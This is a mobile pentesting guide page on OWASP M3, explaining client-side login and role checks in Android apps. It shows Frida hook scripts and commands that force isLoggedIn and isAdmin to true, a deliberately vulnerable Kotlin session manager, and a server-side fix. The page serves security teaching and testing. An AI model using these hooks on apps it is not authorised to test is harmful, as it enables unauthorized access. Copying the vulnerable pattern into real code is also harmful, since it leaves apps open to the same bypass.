---
title: "Insecure authentication & authorization"
description: "Client-side login state, weak session and token handling, and authorization decisions made on the device — bypassing a boolean isLoggedIn / role check with Frida, and the server-enforced fix."
tags:
  - Android
  - Authentication
  - Frida
  - OWASP Mobile Top 10
---

# Insecure authentication & authorization

!!! note "What this page is doing"
    This is OWASP Mobile Top 10 **M3 — Insecure authentication/authorization**. The common thread across this class is a decision that must be trustworthy — am I logged in, what is my role, is my session valid — made entirely on a device the attacker fully controls. If the decision lives on the client, the client can be told whatever answer the attacker wants.

## Explanation

Authentication and authorization are the server's job. The device is untrusted hardware running untrusted code as far as the server is concerned, which means any check performed only in the app is advisory at best. The recurring failure modes:

- **Client-side login state** — a local boolean (`isLoggedIn`), a flag in `SharedPreferences`, or an in-memory field that the app checks before showing a protected screen, with no equivalent check on the server for the API calls that screen makes.
- **Client-side authorization** — a role or permission check (`isAdmin`, `hasPremiumAccess`) evaluated in Java/Kotlin, gating which UI is shown or which code path runs, while the backend trusts whatever the client sends.
- **Weak session/token handling** — tokens that never expire, tokens accepted without signature or server-side validation, or a session identifier that is predictable or reused across devices.
- **Insecure "remember me"** — long-lived credentials or tokens stored in plaintext (or weakly obfuscated) `SharedPreferences`, with no re-authentication required for sensitive actions.
- **Authorization decisions made on the device** generally — any place where "should this user be allowed to do X" is answered by app logic instead of by a request to a server that holds the authoritative session and permission state.

The tell is architectural, not cryptographic: no key is weak here, no cipher is broken — the trust boundary is just in the wrong place. A device-side check can always be hooked, patched, or skipped; the only check that holds is one the server makes on every request that matters, independent of what the client claims about itself.

## Exploitation

1. Identify the gate — a screen, feature, or API call that the app appears to guard based on login or role state.
2. Decompile to find the check (`isLoggedIn`, `getUserRole`, `onAuthenticationSucceeded`-style callbacks that set a flag rather than unlocking a server-issued credential).
3. Confirm the check is local-only by testing whether the gated functionality works when the underlying server call is replayed without a valid session (via a proxy) — if the server accepts it anyway, the gate is cosmetic.
4. Hook the check with Frida to force the "authenticated"/"authorized" branch regardless of actual credentials, and confirm the app proceeds into functionality the attacker should not have.

## Steps

1. Decompile and locate the authentication/authorization logic:

    ```bash
    jadx -d out_jadx vulnerable-app.apk
    grep -Rnw out_jadx -e 'isLoggedIn' -e 'isAuthenticated' -e 'isAdmin' \
      -e 'hasPremiumAccess' -e 'userRole'
    ```

2. Read the matched class to see what sets and checks the flag, and whether any network call accompanies the state change:

    ```bash
    cat out_jadx/sources/com/example/vulnerableapp/auth/SessionManager.java
    ```

3. Trace whether the corresponding API calls are actually re-validated server-side by capturing traffic through a proxy ([set up proxy & certificates](../proxy-certificates.md)) while exercising the gated feature normally, then replaying the request with the session/auth header stripped or altered.

4. If the gate is local, confirm the exact method to hook with `frida-trace`:

    ```bash
    frida-ps -Uai | grep -i vulnerableapp
    frida-trace -U -f com.example.vulnerableapp -i 'isLoggedIn*' -i 'isAdmin*'
    ```

5. Write and load the hook, spawning fresh so the check is patched before the app's own startup logic runs:

    ```javascript
    Java.perform(function () {
        var SessionManager = Java.use('com.example.vulnerableapp.auth.SessionManager');

        // Force the local login-state check to always report "logged in"
        SessionManager.isLoggedIn.implementation = function () {
            console.log('[hook] isLoggedIn() forced to true');
            return true;
        };

        // Force the local role check to always report admin
        SessionManager.isAdmin.implementation = function () {
            console.log('[hook] isAdmin() forced to true');
            return true;
        };
    });
    ```

    ```bash
    frida -U -f com.example.vulnerableapp -l bypass_auth.js --no-pause
    ```

6. Navigate the app and confirm gated screens and admin-only functionality now render without valid credentials.

7. Replay the underlying API calls for that functionality directly (outside the app, via the proxy's repeater) to determine whether the bypass is purely cosmetic (server rejects it) or a full authorization bypass (server accepts it) — this is the finding that matters for the report.

## Remediation

- **Enforce every authentication and authorization decision server-side**, on every request, independent of any flag the client holds or sends. The client's job is to reflect state, not to decide it.
- **Issue short-lived, signed session tokens** (e.g. JWT with server-side signature verification — see [JWT](../../web-application-pentesting/jwt/index.md)) and validate them on every protected endpoint; never accept a bare client-asserted role or user ID.
- **Treat client state as a cache, not a source of truth.** A local `isLoggedIn` flag may drive UI responsiveness, but it must never be the only thing standing between a user and a protected action.
- **Re-authenticate for sensitive actions** rather than trusting a long-lived "remember me" token for everything, and store any locally-held token using the Keystore-backed `EncryptedSharedPreferences`, not plaintext.
- **Expire and rotate tokens**, and give the server the ability to revoke a session immediately (logout, password change, suspected compromise) — a bypassable client-side flag cannot be revoked at all.

## Example

**Vulnerable: login state as a local boolean, checked client-side only**

```kotlin
object SessionManager {
    // Set to true after a login response is received, with no server-side
    // re-validation when gated screens or actions are later used
    var isLoggedIn: Boolean = false
        private set

    var isAdmin: Boolean = false
        private set

    fun handleLoginResponse(response: LoginResponse) {
        isLoggedIn = response.success
        isAdmin = response.role == "admin"
        // No session token is stored or sent on later requests —
        // the app just remembers "yes, this device is logged in"
    }
}

class AdminPanelActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (!SessionManager.isAdmin) {
            finish()
            return
        }
        // Admin-only functionality, gated only by the flag above
        loadAdminDashboard()
    }
}
```

**Exploit: force the flags with Frida, no valid credentials needed**

```javascript
Java.perform(function () {
    var SessionManager = Java.use('com.example.vulnerableapp.SessionManager');
    SessionManager.isLoggedIn.value = true;
    SessionManager.isAdmin.value = true;
    console.log('[hook] SessionManager flags forced to true');
});
```

```bash
frida -U -f com.example.vulnerableapp -l force_admin.js --no-pause
```

With the hook attached, `AdminPanelActivity` opens and renders the admin dashboard without any login having occurred — the only thing that changed is a static field in the running process.

**Fix: server-issued, server-verified session**

```kotlin
class AdminPanelActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        lifecycleScope.launch {
            // Ask the server, every time — the client holds no authority of its own
            val result = api.get("/admin/dashboard", auth = sessionToken)
            if (result.isUnauthorized()) {
                finish()
                return@launch
            }
            renderDashboard(result.body)
        }
    }
}
```

```javascript
// Backend: the only place "is this user an admin" is actually decided
app.get('/admin/dashboard', requireValidSessionToken, async (req, res) => {
  const user = await getUserFromSession(req.session);
  if (user.role !== 'admin') {
    return res.status(403).json({ error: 'forbidden' });
  }
  res.json(await buildAdminDashboard());
});
```

Now a Frida hook on the client changes nothing: there is no local flag left to flip, and every protected response comes from a server call that independently verifies the session and the role on each request.
